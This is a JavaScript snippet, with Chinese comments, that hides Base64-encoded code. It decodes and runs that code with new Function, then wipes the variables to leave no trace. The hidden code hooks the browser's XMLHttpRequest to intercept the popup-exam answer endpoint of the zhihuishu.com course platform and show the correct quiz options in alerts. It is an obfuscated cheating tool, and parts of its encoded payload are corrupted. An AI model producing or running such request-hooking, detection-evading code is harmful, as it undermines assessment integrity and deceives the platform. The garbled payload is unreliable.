// 目标代码分段Base64加密（按语法逻辑拆分，无注释残留）
const encryptedXHRCode = [
  "Y29uc3QgT3JpZ2luYWxYSFIgPSB3aW5kb3cuWE1MSHR0cFJlcXVlc3Q7Y2xhc3MgTXlYSFIgZXh0ZW5kcyBPcmlnaW5hbFhIUntjb25zdHJ1Y3Rvcigpe3N1cGVyKCk7YWxlcnQoIui/h+S6pOi9veWFtby4uLikiO3RoaXMuYWRkRXZlbnRMaXN0ZW5lcignbG9hZHN0YXJ0JywgKGUpPT57Y29uc29sZS5sb2coJ+S4juWFseWFt+WFseWFtFgiLCB7bWV0aG9kOiB0aGlzLm1ldGhvZCx1cmw6IHRoaXMudXJsLGJvZHk6IHRoaXMucmVxdWVzdEJvZHl9Jst9Jst0aGlzLmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLCAoZSk9PntpZih0aGlzLnVybC5pbmNsdWRlcygnc3R1ZHlzZXJ2aWNlLWFwaS56aGlodWlzaHUuY29tL2dhdGV3YXkvdC92MS9wb3B1cEFuc3dlci9sZXNzb25Qb3B1eEV4YW0nKSl7YWxlcnQoJ3VybDonaXRoaXMudXJsJstpaih0aGlzLnN0YXR1cyA9PT0gMjAwKXt0aGlzLnJlc3BvbnNlVGV4dCA9IEpTT04ucGFyc2UodGhpcy5yZXNwb25zZVRleHR8fCdyeyJ9Jyk7dGhpcy5yZXNwb25zZVRleHQ/LmRhdGEvPmxlc3NvbkRlc2t0ZUNoaW5lc0VzZXRJbnRlcmZhY2VEdG9zWyhdXS8/dGVzdFF1ZXN0aW9uLz9xdWVzdGlvbk9wdGlvbnMuZm9yRWFjaCgodGltZWwsaW5kZXgsYXJyYXkpPntpZih0aW1lbC8/X3Jlc3VsdCA9PT0gIjEiKXthbGVydCgnaGFuZ2U6Jyt0aW1lbC8/X3NvcnQpO319O3RoaXMucmVzcG9uc2VUZXh0ID0gSlNPTi5zdHJpbmdpZnko dGhpcy5yZXNwb25zZVRleHQpO319fTt9",
  "c2VuZChib2R5KXt0aGlzLnJlcXVlc3RCb2R5ID0gYm9keTtzdXBlci5zZW5kKGJvZHkpO307b3BlbihtZXRob2QsIHVybCl7dGhpcy5tZXRob2QgPSBtZXRob2Q7dGhpcy51cmwgPSB1cmw7c3VwZXIub3BlbihtZXRob2QsIHVybCk7fX07d2luZG93LlhNTEh0dHBSZXF1ZXN0ID0gTXlYSF I7"
];

// 逐段解密执行+内存清除核心函数
async function decryptRunAndClean() {
  for (let i = 0; i < encryptedXHRCode.length; i++) {
    // 解密当前分段
    let decoded = atob(encryptedXHRCode[i]);
    // 执行解密代码（独立作用域，避免污染）
    new Function(decoded)();
    // 立即清除内存引用
    encryptedXHRCode[i] = null;
    decoded = undefined;
    // 短暂延迟确保执行完成
    await new Promise(resolve => setTimeout(resolve, 60));
  }
  // 清空数组，彻底消除残留
  encryptedXHRCode.length = 0;
}

// 启动流程
decryptRunAndClean();
